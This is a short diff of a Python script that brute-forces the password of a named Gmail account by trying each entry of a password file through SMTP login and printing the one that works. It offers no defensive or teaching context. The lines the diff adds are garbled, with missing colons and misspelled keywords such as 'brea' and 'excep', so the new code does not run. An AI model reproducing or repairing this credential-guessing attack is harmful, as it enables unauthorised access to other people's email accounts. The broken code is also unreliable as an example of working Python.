@@ -6,13 +6,12 @@ smtpserver.starttls()
 
 
 usr = "fikrado1.2@gmail.com"
-passwfile = open("/password.txt")
 
-for password in passwfile:
-    try:
-            smtpserver.login(usr, password)
-
-            print(password)
-            break;
-    except smtplib.SMTPAuthenticationError:
-        print("doqoon")
+with open("/password.txt") as passwfile
+     for password i passwfile
+         try
+             smtpserver.login(usr, password.strip())
+             print(password.strip())
+             brea
+         excep smtplibSMTPAuthenticationError
+             print("doqoon
